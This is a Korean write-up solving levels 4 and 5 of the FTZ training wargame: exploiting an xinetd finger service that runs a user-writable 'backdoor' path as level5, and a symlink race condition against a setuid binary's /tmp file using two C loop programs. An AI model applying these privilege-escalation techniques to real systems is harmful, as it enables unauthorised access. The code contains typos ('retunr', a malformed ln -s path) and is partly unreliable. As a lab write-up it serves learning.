# FTZ level 4 & 5번 문제풀이



7 / 30, 2018 Jinyan 김상민	



FTZ 4번 ~ 5번까지의 문제풀이를 하고자 합니다.

> 환경 : Windows 10
>
> - Red Hat Linux 9.0 (VMware Workstation)
> - putty



#### 1. 4번 문제 풀이

level 4의 힌트를 찾아보았습니다.

<img src=https://user-images.githubusercontent.com/37801676/43368794-c0101bf8-939d-11e8-8692-6400ef538b43.PNG>

/etc/xinetd.d 디텍토리에 백도어를 심어 놓았다고 합니다.

먼저 /etc/ 설정 파일에 xinetd.d 디텍토리가 무슨 정보를 담는지 확인해 보았습니다.

```
xinetd 란 (RedHat Linux7에서 부터 제공)
네트워크에 들어오는 요청을 받고, 적절한 서비스를 실행시켜주는 '슈퍼 데몬'
------------------------------------------------------------------------------------------------
설정 파일(파일.conf)을 제공하는 서비스들의 설정은 etc/xinetd.d 디텍토리에 저장된다.
```

그리고 /etc/xinetd.d 디텍토리에 들어가 파일을 확인 보았습니다. 

<img src=https://user-images.githubusercontent.com/37801676/43368795-c04d7340-939d-11e8-98d3-f5a2cbd6d279.PNG>

backdoor라는 파일이 있었고, 권한은 읽기만 가능했기 때문에 바로 출력해 보았습니다.

<img src=https://user-images.githubusercontent.com/37801676/43368796-c0767024-939d-11e8-9e0c-a1fda229df94.PNG>

```
service finger									서비스 : finger (사용자의 계정정보 확인 명령)
{
    	disable = no							나열된 서비스 값들을 실행 못하도록 지정 : no
    	flags	= REUSE							포트가 사용중의 경우에서도 재이용 가능
    	wait	= no							xinetd가 서비스 요청을 받은 경우, 즉시 또 다른 												  요청을 처리 하지 못하도록 지정 : no
    	user	= level5						어떤 사용자 권한으로 서비스 : level5
    	server	= /home/level4/tmp/backdoor		  해당 서비스 실행할 데몬 프로그램 위치
    	log_on_failuer += USERID				 거부되었을 때 기록될 원격 사용자의 ID
}
```

backdoor 설정을 해석해 보았을때 /home/level4/tmp/backdoor 위치에서 level5권한으로 실행 된다는 것을 확인 할 수 있었습니다. 

그래서 home/level4/tmp 로 넘어가고 파일을 확인해 보았습니다.

<img src=https://user-images.githubusercontent.com/37801676/43368797-c0a09c50-939d-11e8-81be-493caceecb66.PNG>

backdoor란 파일이 존재하지 않았습니다.

그래서 임의로 backdoor란 파일을 소스코드와 컴파일을 이용하여 만들어 주었습니다.

 <img src=https://user-images.githubusercontent.com/37801676/43368798-c0ca71b0-939d-11e8-8b2a-58a63ebff74e.PNG>

<img src=https://user-images.githubusercontent.com/37801676/43368799-c0f3cca4-939d-11e8-86f6-45ddfc809125.PNG>

그런다음 finger 명령어를 사용하여 서비스를 실행해보았습니다.

```
$ finger @localhost
```

<img src=https://user-images.githubusercontent.com/37801676/43369147-c142e43c-93a3-11e8-86b5-567d19cecacc.PNG>

이렇게 계정 정보를 확인할 수 있었습니다.



#### 2. 5번 문제풀이

level5의 힌트를 확인해 보았습니다.

<img src=https://user-images.githubusercontent.com/37801676/43370444-fa9eaac0-93b9-11e8-929a-2b2374a1edcc.PNG>

level5의 실행 파일을 보면 setuid가 걸려있는 것으로 볼 수 있습니다.

<img src=https://user-images.githubusercontent.com/37801676/43370462-0a675c2c-93ba-11e8-8c59-970988592d68.PNG>

/usr/bin/level5를 실행을 시키면 /tmp 디텍토리에 임시파일이 생긴다. 라는 것을 볼 수 있는데, 먼저 level5를 실행해봅시다.

<img src=https://user-images.githubusercontent.com/37801676/43370464-16d7de00-93ba-11e8-8d7f-d3dcf75dc07a.PNG>

/tmp 디텍토리에 임시파일을 확인해 봅시다.

임시파일을 없는 것으로 보면, 실행 하면 생겼다가 종료할때 삭제되는 것을 짐작 할 수 있었습니다.



먼저 앞에 확인했던 setuid와 tmp 임시파일을 들으면 " **레이스 컨디션** " 을 사용 할 수 있다고 생각 하시면 됩니다. 

```
레이스 컨디션이란?
"공유 자원에 대해 여러개의 프로세스가 동시에 접근하기 위해 경쟁하는 상태"
즉 프로세스들이 경쟁하는 것을 이용하여 관리자 권한을 얻는 공격 기법
--------------------------------------------------------------------------
기본 개념
레이스 컨디션 공격의 대상은 소유자가 상위권한이고, setuid가 설정된 임시 파일을 생성 하는 프로그램
#정상
프로그램이 실행되면 setuid로 인해 프로세스 권한이 상승 되고 임시 파일의 존재 여부를 확인한다. 만약 임시파일이 있다면 삭제하고 재생성해 프로그램이 동작하고 임시파일은 삭제된다.
#해커의 관점
해커는 재생성된 임시파일을 삭제하고 임시 파일의 이름으로 심볼릭 링크를 생성한다. 그 후, 프로그램이 동작하고 임시 파일은 삭제된다.
```

순서도

1 - 프로그램 실행

2 - 생성할 임시파일과 같은 이름의 파일이 있는지 없는지 검사

3 - 같은 이름의 파일이 있으면 삭제하고, 없다면 계속

4 - 임시파일을 생성



미리 심볼릭 링크를 만들어 놓으면 삭제가 되기 때문에 3번과 4번의 사이를 노려줍니다.

하지만 3번과 4번 사이에 심볼릭 링크를 생성하는 것은 어렵기 때문에 반복 작업을 해줍니다. (프로그램을 이용)

그래서 그 반복할 프로그램을 만들어줍니다.

```
#level5를 반복실행 하도록 하는 프로그램(Sleepy)

#include<stdio.h>
int main()
{
 int i;
 for(i=0; i<=1000; i++)    
 {
  system("/usr/bin/level5");
 }
 retunr 0;
}
```

```
  심볼릭 링크 생성을 반복하는 프로그램(Sleepy2)
#include<stdio.h>
int main()
{
 int i;
 for(i=0; i<=1000; i++)    
 {
  system("ln -s /tmp/Sleepy3/tmp/level5.tmp");
 }
}
```

```
cd /tmp
cat >> Sleepy3 : 씌여줄 파일을 만들어줍니다.

이후 소스파일 컴파일

gcc -o Sleepy Sleepy.c
gcc -o Sleepy2 Sleepy2.c

컴파일 이후 실행

./Sleepy &   : &를 붙이면 다음 명령 실행 가능
./Sleepy2

그 이후 cat ./Sleepy3 에 기록되있는 것을 확인 할 수 있습니다. 
```





